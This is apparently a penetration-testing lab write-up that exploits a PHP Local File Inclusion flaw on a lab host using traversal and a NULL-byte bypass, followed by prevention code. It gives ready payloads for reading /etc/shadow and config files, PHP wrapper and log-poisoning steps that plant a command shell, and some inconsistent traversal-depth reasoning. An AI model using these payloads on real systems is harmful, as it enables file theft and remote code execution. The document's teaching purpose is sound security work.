# Lab 6: Local File Inclusion (LFI) - Black Box Testing with NULL Byte Bypass

## Overview

**Difficulty:** Intermediate  
**Testing Type:** Black-Box (No source code access)  
**Main Technique:** NULL Byte Injection  
**Target:** Read system files through LFI vulnerability

## Objective
Exploit a Local File Inclusion (LFI) vulnerability without access to source code. Use error messages to understand the application's behavior and leverage NULL byte injection to bypass file extension restrictions.

## Lab Description
This lab simulates a **real-world penetration testing scenario** where you don't have access to the application's source code. You must rely on:
- Error messages
- Application behavior
- Trial and error
- Logical deduction

**Target Application:**
```
http://webapp.thm/index.php?lang=EN
```

**Goal:** Read the contents of `/etc/passwd` file

## Understanding Testing Approaches

### Black-Box Testing (What We're Doing)

**Definition:** Testing without knowledge of internal workings

**Characteristics:**
- 🚫 **No source code access** - Cannot read application logic
- 🚫 **No internal documentation** - Don't know implementation details
- ✅ **User perspective** - Test as an external attacker would
- ✅ **Realistic simulation** - Mirrors real-world attack scenarios
- 🔍 **Relies on:** Error messages, behavior patterns, response analysis

**Advantages:**
- Unbiased testing (not influenced by code knowledge)
- Tests actual user-facing security
- Discovers issues visible to real attackers
- No need for source code access

**Disadvantages:**
- Time-consuming (more trial and error)
- May miss deeply hidden vulnerabilities
- Limited understanding of root causes

### White-Box Testing (The Alternative)

**Definition:** Testing with full knowledge of internal workings

**Characteristics:**
- ✅ **Full source code access** - Can read all application code
- ✅ **Internal documentation** - Know implementation details
- ✅ **Thorough analysis** - Can trace data flow completely
- 🔍 **Relies on:** Code review, static analysis, documentation

**Comparison Table:**

| Aspect | Black-Box | White-Box |
|--------|-----------|-----------|
| **Source Code** | ❌ Not available | ✅ Available |
| **Speed** | ⚠️ Slower | ✅ Faster |
| **Coverage** | ⚠️ Surface-level | ✅ Deep/Complete |
| **Realism** | ✅ Real attacker view | ⚠️ Insider view |
| **Skill Required** | ✅ Security testing | ✅ Code review + Security |
| **Best For** | External pentests | Code audits |

**In This Lab:**
We use **black-box testing** to simulate a real penetration test where we must discover and exploit vulnerabilities using only what the application reveals through its behavior and error messages.

## Background: What is Local File Inclusion (LFI)?

### Definition

**Local File Inclusion (LFI)** is a web security vulnerability that occurs when an application uses user-controlled input to construct file paths without proper validation. This allows attackers to include and execute files that exist on the web server.

### How LFI Vulnerabilities Occur

```
User Input → Application Code → File System Access
    ↓              ↓                    ↓
  "EN"    →    include("EN.php")  →  ✅ Intended
  "../../etc/passwd" → include("../../etc/passwd") → ❌ Malicious
```

### Root Causes

1. **Direct User Input in File Operations**
   ```php
   // VULNERABLE CODE
   $file = $_GET['page'];
   include($file);  // User controls the file path!
   ```

2. **Insufficient Input Validation**
   - No checks for path traversal sequences (`../`)
   - No whitelist of allowed files
   - No sanitization of user input

3. **Predictable File Structures**
   - Developers hardcode paths
   - Use consistent naming patterns
   - Don't implement access controls

### Common Vulnerable Functions by Language

| Language | Vulnerable Functions |
|----------|---------------------|
| **PHP** | `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`, `fopen()` |
| **Python** | `open()`, `file()`, `exec()`, `eval()` |
| **Java** | `FileInputStream()`, `FileReader()`, `File()` |
| **Node.js** | `fs.readFile()`, `fs.readFileSync()`, `require()` |
| **ASP.NET** | `File.OpenRead()`, `Response.WriteFile()` |

### Why LFI is Dangerous

**Direct Impacts:**
1. 📄 **Information Disclosure** - Read sensitive files
2. 🔑 **Credential Theft** - Access config files with passwords
3. 📝 **Source Code Exposure** - Understand application logic
4. 🚪 **Further Exploitation** - Use as stepping stone to RCE

**Potential Escalation:**
```
LFI → Read logs → Log poisoning → Code execution → Full server compromise
```

## Phase 1: Initial Reconnaissance

### Step 1: Observe Normal Application Behavior

**Action:** Access the application with a valid parameter

**Request:**
```
http://webapp.thm/index.php?lang=EN
```

**Observations:**
- ✅ Page loads successfully
- ✅ Content displayed in English
- ✅ No errors shown
- ✅ Normal functionality confirmed

**Hypothesis About Backend Code:**
```php
<?php
// Likely implementation
$lang = $_GET['lang'];
include("languages/" . $lang . ".php");
// Includes: languages/EN.php
?>
```

**Key Insight:** The application likely builds a file path using our input and includes it.

---

### Step 2: Test with Invalid Input (Error Generation)

**Objective:** Force the application to reveal information through error messages

**Action:** Provide an input that doesn't correspond to an existing file

**Request:**
```
http://webapp.thm/index.php?lang=THM
```

**Error Message Received:**
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

**🎯 Jackpot!** This error message is a goldmine of information.

---

## Phase 2: Error Message Analysis

### Breaking Down the Error

Let's dissect every piece of information this error reveals:

#### Discovery #1: The Include Function
```
include(languages/THM.php)
```

**What This Tells Us:**
- Function used: `include()`
- Our input goes directly into this function
- File path is constructed: `languages/` + `THM` + `.php`

#### Discovery #2: Directory Structure
```
languages/THM.php
```

**What This Tells Us:**
- Files are stored in a `languages/` subdirectory
- Application expects files in this location
- Our input is placed between `languages/` and `.php`

#### Discovery #3: Automatic Extension Appending
```
THM → THM.php
```

**What This Tells Us:**
- Application automatically adds `.php` extension
- We input `THM`, it becomes `THM.php`
- **This is a problem we'll need to bypass!**

#### Discovery #4: Full Server Path
```
/var/www/html/THM-4/index.php on line 12
```

**What This Tells Us:**
- **Absolute path:** `/var/www/html/THM-4/`
- **Directory depth:** 4 levels from root
  ```
  / → var → www → html → THM-4
  ```
- **Vulnerable code location:** Line 12 of index.php
- **Directory traversal target:** Need to go up 4 levels

### Reconstructing the Vulnerable Code

Based on our error analysis, the code likely looks like:

```php
<?php
// index.php (line 12)
$lang = $_GET['lang'];
include("languages/" . $lang . ".php");
?>
```

**Vulnerable Pattern:**
```
User Input → Inserted into file path → No validation → Include executed
```

## Phase 3: Planning the Attack

### Understanding Our Challenges

We now know how the application works, but we face **two major obstacles**:

```
┌─────────────────────────────────────────┐
│         Challenge #1                     │
│     Directory Traversal                  │
│                                          │
│  Current: /var/www/html/THM-4/languages/ │
│  Target:  /etc/passwd                    │
│  Need:    Escape current directory       │
└─────────────────────────────────────────┘
                  +
┌─────────────────────────────────────────┐
│         Challenge #2                     │
│      Extension Appending                 │
│                                          │
│  We input:  /etc/passwd                  │
│  Becomes:   /etc/passwd.php              │
│  Problem:   This file doesn't exist!     │
└─────────────────────────────────────────┘
```

Let's solve each challenge:

---

### Challenge #1: Directory Traversal

**Current Location:**
```
/var/www/html/THM-4/languages/
```

**Target File:**
```
/etc/passwd
```

**Solution:** Use `../` to move up directory levels

**Path Calculation:**
```
Step 1: Start at /var/www/html/THM-4/languages/
Step 2: Go up 1 level → /var/www/html/THM-4/
Step 3: Go up 2 levels → /var/www/html/
Step 4: Go up 3 levels → /var/www/
Step 5: Go up 4 levels → /var/
Step 6: Go up 5 levels → / (root)
Step 7: Navigate to → /etc/passwd
```

**Traversal Sequence:**
```
../../../../../etc/passwd
```

**Visual Representation:**
```
Current:  /var/www/html/THM-4/languages/
           ↓    ↓    ↓     ↓      ↓
           ..   ..   ..    ..     ..  /etc/passwd
           ↑    ↑    ↑     ↑      ↑
         Level5 Level4 Level3 Level2 Level1
```

**Required `../` Count:** 5
- But practically, we use 4 because we're already in the application directory

---

### Challenge #2: File Extension Bypass

**The Problem:**
```php
include("languages/" . "../../../../etc/passwd" . ".php");
//                        ↑                          ↑
//                   Our input                Auto-appended
```

**Result:**
```
/etc/passwd.php  ← This file doesn't exist!
```

**The Solution: NULL Byte Injection**

We'll use a **NULL byte** (`%00`) to terminate the string before `.php` is appended.

```php
include("languages/" . "../../../../etc/passwd%00" . ".php");
//                                              ↑
//                                    String ends here!
```

**After NULL byte processing:**
```php
include("languages/../../../../etc/passwd");
//                                        ↑
//                      .php is ignored!
```

## Phase 4: Exploitation - Step by Step

### ❌ Attempt 1: Basic Directory Traversal (Will Fail)

Let's start with the obvious approach and see why it fails.

**Payload:**
```
../../../../etc/passwd
```

**Full URL:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

**What the Application Does:**
```php
$lang = "../../../../etc/passwd";
include("languages/" . $lang . ".php");
//      becomes:
include("languages/../../../../etc/passwd.php");
```

**File System Resolution:**
```
/var/www/html/THM-4/languages/../../../../etc/passwd.php
→ /var/www/html/../../../../etc/passwd.php
→ /../../../../etc/passwd.php
→ /etc/passwd.php
```

**Error Received:**
```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

**Analysis:**
- ✅ **Successfully traversed** out of the application directory
- ✅ **Reached** the `/etc/` directory
- ❌ **Failed** because it's looking for `/etc/passwd.php` not `/etc/passwd`
- ❌ **The `.php` extension** is the blocker

**Conclusion:** We need a way to remove or ignore the `.php` extension.

---

### ✅ Attempt 2: NULL Byte Injection (Success!)

Now we'll use NULL byte injection to bypass the extension restriction.

**Payload:**
```
../../../../etc/passwd%00
```

**Full URL:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

**What the Application Does:**
```php
$lang = "../../../../etc/passwd%00";
include("languages/" . $lang . ".php");
//      becomes:
include("languages/../../../../etc/passwd%00.php");
```

**After NULL Byte Processing:**
```php
// PHP sees NULL byte (%00) and terminates the string there
include("languages/../../../../etc/passwd");
//                                        ↑
//                          String ends here!
//                          .php is ignored
```

**File System Resolution:**
```
/var/www/html/THM-4/languages/../../../../etc/passwd
→ /etc/passwd  ✅ Perfect!
```

**Result:**
```
🎉 SUCCESS!
File contents are displayed:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

**Why This Works:** The NULL byte terminates the string in PHP's C-based string handling, causing everything after it (including `.php`) to be ignored.

## Deep Dive: Understanding NULL Byte Injection

### What is a NULL Byte?

**Definition:** A NULL byte is a special character that represents "nothing" or "end of string" in programming languages that use C-style string handling.

**Representations:**
| Format | Value | Usage |
|--------|-------|-------|
| **URL Encoded** | `%00` | In web requests/URLs |
| **Hexadecimal** | `0x00` | In programming/debugging |
| **Character Escape** | `\0` | In code/scripts |
| **Decimal** | `0` | Numeric representation |

---

### How NULL Bytes Work in C and PHP

#### The C String Model

PHP (especially older versions) uses C-style strings internally:

```c
// C uses NULL byte to mark end of strings
char str[] = "Hello";
// Internally stored as: ['H']['e']['l']['l']['o']['\0']
//                                                  ↑
//                                          NULL terminator
```

**Key Concept:** When C encounters `\0`, it stops reading the string, regardless of what comes after.

---

### NULL Byte in Action

#### Example 1: String Termination
```
String before NULL byte: "password%00.php"
                                    ↑
                            NULL byte here

What PHP reads: "password"
What PHP ignores: ".php"
```

#### Example 2: In Our LFI Attack

**Step-by-Step Processing:**

```php
// 1. Developer's Code
include("languages/" . $input . ".php");

// 2. Attacker's Input
$input = "../../../../etc/passwd%00"

// 3. String Construction
$path = "languages/" . "../../../../etc/passwd%00" . ".php";
// Result: "languages/../../../../etc/passwd%00.php"

// 4. Internal String Representation
['l']['a']['n']['g']['u']['a']['g']['e']['s']['/']['p']['a']['s']['s']['w']['d'][\0]['.']['p']['h']['p']
                                                                                   ↑
                                                            PHP stops reading here!

// 5. What PHP Actually Uses
"languages/../../../../etc/passwd"
// The .php part is completely ignored!
```

---

### Visual Representation of NULL Byte Effect

```
┌─────────────────────────────────────────────────────┐
│  Original String (in memory)                         │
├─────────────────────────────────────────────────────┤
│  languages/../../../../etc/passwd%00.php            │
│                                      ↓               │
│                               NULL BYTE              │
└──────────────────────────────┬──────────────────────┘
                               │
                ┌──────────────┴──────────────┐
                │                             │
       ┌────────▼──────────┐        ┌───────▼─────┐
       │  String Up To     │        │  Ignored    │
       │  NULL Byte        │        │  Part       │
       │  (USED)           │        │  (UNUSED)   │
       ├───────────────────┤        ├─────────────┤
       │ languages/        │        │ .php        │
       │ ../../../../      │        │             │
       │ etc/passwd        │        │             │
       └───────────────────┘        └─────────────┘
              ✅                          ❌
```

---

### Why This is a Security Vulnerability

**The Problem:** String handling inconsistency

```
┌──────────────────────────┐
│  PHP Level               │
│  (High-level code)       │
├──────────────────────────┤
│  Concatenation: OK       │
│  String = "...%00.php"   │
└──────────┬───────────────┘
           │
           ▼
┌──────────────────────────┐
│  C Level                 │
│  (Low-level processing)  │
├──────────────────────────┤
│  Sees: "...%00"          │
│  Stops: At NULL byte     │
│  Ignores: Everything     │
│           after          │
└──────────────────────────┘
```

**Exploitation Flow:**
```
Developer concatenates: "file" + ".php"
   ↓
Attacker injects NULL: "file%00"
   ↓
Final string in PHP: "file%00.php"
   ↓
C-level processing: "file" (stops at NULL)
   ↓
Bypass achieved! .php extension ignored
```

---

### Practical Demonstration

You can test NULL byte behavior yourself:

**PHP Code Example:**
```php
<?php
// Test NULL byte behavior
$filename = "/etc/passwd\0.php";
echo "Constructed filename: " . $filename . "\n";
echo "Length: " . strlen($filename) . "\n";

// On PHP < 5.3.4, this would include /etc/passwd
// On PHP >= 5.3.4, this will fail (security fix)
include($filename);
?>
```

**Output on Vulnerable PHP:**
```
Constructed filename: /etc/passwd.php
Length: 16
[Contents of /etc/passwd displayed]
```

**Output on Patched PHP:**
```
Warning: include(): Failed opening '/etc/passwd\0.php'
```

## Complete Lab Walkthrough

### Step 1: Identify the Vulnerability

**Test Normal Input:**
```
http://webapp.thm/index.php?lang=EN
```
**Result:** ✅ Page works normally

**Test Invalid Input:**
```
http://webapp.thm/index.php?lang=INVALID
```
**Result:** ❌ Error message reveals implementation details

**Conclusion:** Parameter is vulnerable to injection

---

### Step 2: Analyze Error Messages

**Error Analysis:**
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

**Extract Information:**
1. ✅ Function: `include()`
2. ✅ Path structure: `languages/` + input + `.php`
3. ✅ Server path: `/var/www/html/THM-4/`
4. ✅ Directory depth: 4 levels

---

### Step 3: Calculate Directory Traversal Depth

**From Error:** `/var/www/html/THM-4/`

**Count Levels:**
```
/ (root) ────────── Level 0 (target)
└── var/        ── Level 1
    └── www/    ── Level 2
        └── html/ ── Level 3
            └── THM-4/ ── Level 4 (current)
                └── languages/ ── Level 5 (actual current)
```

**Traversal Needed:** 4 × `../` to reach root
- From `languages/` → `THM-4/` (1)
- From `THM-4/` → `html/` (2)
- From `html/` → `www/` (3)
- From `www/` → `var/` (4)
- From `var/` → `/` (root)

---

### Step 4: Craft the Basic Payload

**Basic Directory Traversal:**
```
../../../../etc/passwd
```

**Test URL:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

**Expected Result:** ❌ Error showing `/etc/passwd.php` not found

**Reason:** `.php` extension is appended automatically

---

### Step 5: Add NULL Byte Bypass

**Enhanced Payload:**
```
../../../../etc/passwd%00
```

**Complete URL:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

**What Happens:**
```
Input: ../../../../etc/passwd%00
  ↓
Constructed: languages/../../../../etc/passwd%00.php
  ↓
NULL byte processing: languages/../../../../etc/passwd
  ↓
Path resolution: /etc/passwd
  ↓
SUCCESS! File included and displayed
```

---

### Step 6: Execute and Verify

**Method 1: Browser**
1. Paste the URL in your browser's address bar
2. Press Enter
3. View the contents of `/etc/passwd`

**Method 2: cURL**
```bash
curl "http://webapp.thm/index.php?lang=../../../../etc/passwd%00"
```

**Method 3: BurpSuite**
1. Intercept the request
2. Modify the `lang` parameter to `../../../../etc/passwd%00`
3. Forward the request
4. Check the response tab

**Expected Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
```

**🎯 Success Criteria:**
- ✅ No error messages
- ✅ File contents displayed
- ✅ Multiple user entries visible
- ✅ Format matches Linux `/etc/passwd` structure

## Reading Other Sensitive Files

### Common Target Files on Linux

| File | Description | Payload |
|------|-------------|---------|
| `/etc/passwd` | User accounts | `../../../../etc/passwd%00` |
| `/etc/shadow` | Password hashes (requires root) | `../../../../etc/shadow%00` |
| `/etc/hosts` | Host file mappings | `../../../../etc/hosts%00` |
| `/etc/issue` | System identification | `../../../../etc/issue%00` |
| `/proc/version` | Kernel version | `../../../../proc/version%00` |
| `/var/log/apache2/access.log` | Web server logs | `../../../../var/log/apache2/access.log%00` |
| `/home/user/.bash_history` | Command history | `../../../../home/user/.bash_history%00` |

### Application Configuration Files

| File | Payload |
|------|---------|
| `/var/www/html/config.php` | `../../../../var/www/html/config.php%00` |
| `/var/www/html/wp-config.php` | `../../../../var/www/html/wp-config.php%00` |
| `/etc/nginx/nginx.conf` | `../../../../etc/nginx/nginx.conf%00` |
| `/etc/mysql/my.cnf` | `../../../../etc/mysql/my.cnf%00` |

### Windows Targets (if applicable)

| File | Payload |
|------|---------|
| `C:\Windows\System32\drivers\etc\hosts` | `../../../../Windows/System32/drivers/etc/hosts%00` |
| `C:\boot.ini` | `../../../../boot.ini%00` |
| `C:\inetpub\wwwroot\web.config` | `../../../../inetpub/wwwroot/web.config%00` |

## Important Notes and Limitations

### NULL Byte Restriction

⚠️ **Critical Limitation:**
```
NULL byte trick only works in PHP versions < 5.3.4
```

**Version Check:**

| PHP Version | NULL Byte Works? |
|-------------|------------------|
| PHP 5.3.3 | ✅ Yes |
| PHP 5.3.4 | ❌ No (patched) |
| PHP 5.4.x | ❌ No |
| PHP 5.5.x | ❌ No |
| PHP 7.x | ❌ No |
| PHP 8.x | ❌ No |

**Why It Was Patched:**
- Serious security vulnerability
- Allowed arbitrary file access
- Easy to exploit
- Fixed in PHP 5.3.4 (August 2010)

### Alternative Bypass Techniques (for newer PHP)

If NULL byte doesn't work, try:

#### 1. Path Truncation
```
http://webapp.thm/index.php?lang=../../../../etc/passwd/././././././.[... many times]
```

#### 2. Encoding Variations
```
%00  (NULL byte)
%0a  (Line feed)
%0d  (Carriage return)
```

#### 3. Double Encoding
```
%2500 (% encoded NULL byte)
```

#### 4. Wrapper Exploitation (if available)
```
php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

## Understanding the Attack Flow

### Complete Request Cycle

```
1. Attacker sends:
   http://webapp.thm/index.php?lang=../../../../etc/passwd%00
   
   ↓
   
2. PHP receives:
   $_GET['lang'] = "../../../../etc/passwd%00"
   
   ↓
   
3. Code constructs:
   include("languages/" . "../../../../etc/passwd%00" . ".php");
   
   ↓
   
4. String becomes:
   "languages/../../../../etc/passwd%00.php"
   
   ↓
   
5. NULL byte terminates string:
   "languages/../../../../etc/passwd"
   
   ↓
   
6. Path resolves to:
   /var/www/html/THM-4/languages/../../../../etc/passwd
   = /etc/passwd
   
   ↓
   
7. File included and displayed
```

## Detection and Testing

### Manual Testing Checklist

- [x] Test with invalid input to trigger errors
- [x] Analyze error messages for path disclosure
- [x] Count directory depth from error message
- [x] Craft directory traversal payload
- [x] Test basic traversal (without NULL byte)
- [x] Identify file extension appending behavior
- [x] Add NULL byte to bypass extension
- [x] Verify successful file inclusion
- [x] Try reading multiple sensitive files

### Automated Testing

**Using BurpSuite:**
1. Send request to Intruder
2. Mark the `lang` parameter as position
3. Load LFI payload list
4. Start attack
5. Look for responses with different lengths

**Using tools like:**
- **LFISuite** - Automated LFI scanner
- **Fimap** - File inclusion vulnerability scanner
- **dotdotpwn** - Directory traversal fuzzer

## Prevention Measures

### For Developers

#### 1. Input Validation (Whitelist)
```php
<?php
$allowed_langs = ['EN', 'FR', 'ES', 'DE'];
$lang = $_GET['lang'];

if (in_array($lang, $allowed_langs)) {
    include("languages/" . $lang . ".php");
} else {
    die("Invalid language selection");
}
?>
```

#### 2. Avoid User Input in File Paths
```php
<?php
// Bad - User input directly in include
include("languages/" . $_GET['lang'] . ".php");

// Good - Use mapping
$lang_map = [
    'en' => 'languages/english.php',
    'fr' => 'languages/french.php'
];
include($lang_map[$_GET['lang']] ?? 'languages/english.php');
?>
```

#### 3. Use basename() Function
```php
<?php
$lang = basename($_GET['lang']); // Removes path traversal
include("languages/" . $lang . ".php");
?>
```

#### 4. Disable Path Traversal Characters
```php
<?php
$lang = $_GET['lang'];
$lang = str_replace(['../', '..\\', './'], '', $lang);
include("languages/" . $lang . ".php");
?>
```

#### 5. Set open_basedir in php.ini
```ini
open_basedir = /var/www/html/
```
This restricts PHP to only access files within specified directory.

### Server Configuration

#### Disable Dangerous PHP Functions
```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

#### File Permission Hardening
```bash
# Restrict web server permissions
chmod 644 /etc/passwd
chmod 600 /etc/shadow
chown root:root /etc/passwd
```

## Real-World Impact

### What Attackers Can Do with LFI

1. **Read Sensitive Files**
   - Database credentials
   - API keys
   - Configuration files

2. **Source Code Disclosure**
   - Understand application logic
   - Find additional vulnerabilities

3. **Log Poisoning** (Advanced)
   - Inject code into log files
   - Include the log file
   - Execute injected code (RCE)

4. **Session Hijacking**
   - Read session files
   - Steal session IDs

5. **Remote Code Execution** (with PHP wrappers)
   - Use `php://input` wrapper
   - Execute arbitrary PHP code

## Advanced Exploitation

### PHP Wrappers (if available)

#### 1. Base64 Encoding
```
http://webapp.thm/index.php?lang=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```
Returns base64 encoded content (useful for non-text files)

#### 2. Expect Wrapper (RCE)
```
http://webapp.thm/index.php?lang=expect://id
```
Executes system commands

#### 3. Data Wrapper
```
http://webapp.thm/index.php?lang=data://text/plain,<?php system($_GET['cmd']); ?>
```

### Log Poisoning Attack

**Step 1:** Inject PHP code into logs
```bash
curl "http://webapp.thm/<?php system(\$_GET['cmd']); ?>"
```

**Step 2:** Include the log file
```
http://webapp.thm/index.php?lang=../../../../var/log/apache2/access.log%00&cmd=whoami
```

## Lab Walkthrough Summary

### Step-by-Step Solution

```
1. Access: http://webapp.thm/index.php?lang=EN
   ✅ Normal behavior observed

2. Test: http://webapp.thm/index.php?lang=THM
   ✅ Error message reveals:
      - Function: include()
      - Path: languages/THM.php
      - Server path: /var/www/html/THM-4/
      - Extension: .php appended

3. Attempt: http://webapp.thm/index.php?lang=../../../../etc/passwd
   ❌ Error: /etc/passwd.php not found
   ✅ Confirms extension appending

4. Exploit: http://webapp.thm/index.php?lang=../../../../etc/passwd%00
   ✅ Successfully reads /etc/passwd
   ✅ NULL byte bypasses .php extension

5. Answer Question #1 with contents of /etc/passwd
```

## Key Takeaways

1. **Error messages are valuable** - They reveal implementation details
2. **Black-box testing requires observation** - Use errors and behavior to understand the app
3. **NULL byte is powerful** - But only works on older PHP versions
4. **Directory traversal depth matters** - Count the levels correctly
5. **File extension restrictions can be bypassed** - NULL byte, wrappers, etc.
6. **LFI can lead to RCE** - Through log poisoning or PHP wrappers
7. **Input validation is critical** - Use whitelists, not blacklists

## Common Mistakes

1. **Wrong number of ../ traversals** - Count directory levels carefully
2. **Forgetting the NULL byte** - Extension will still be appended
3. **Not URL encoding %00** - Browser might not encode it automatically
4. **Testing on modern PHP** - NULL byte won't work on PHP ≥ 5.3.4
5. **Wrong file paths** - Use absolute paths from root (/)

## Status
✅ **Lab Completed** - Successfully exploited LFI vulnerability using NULL byte injection to read `/etc/passwd`
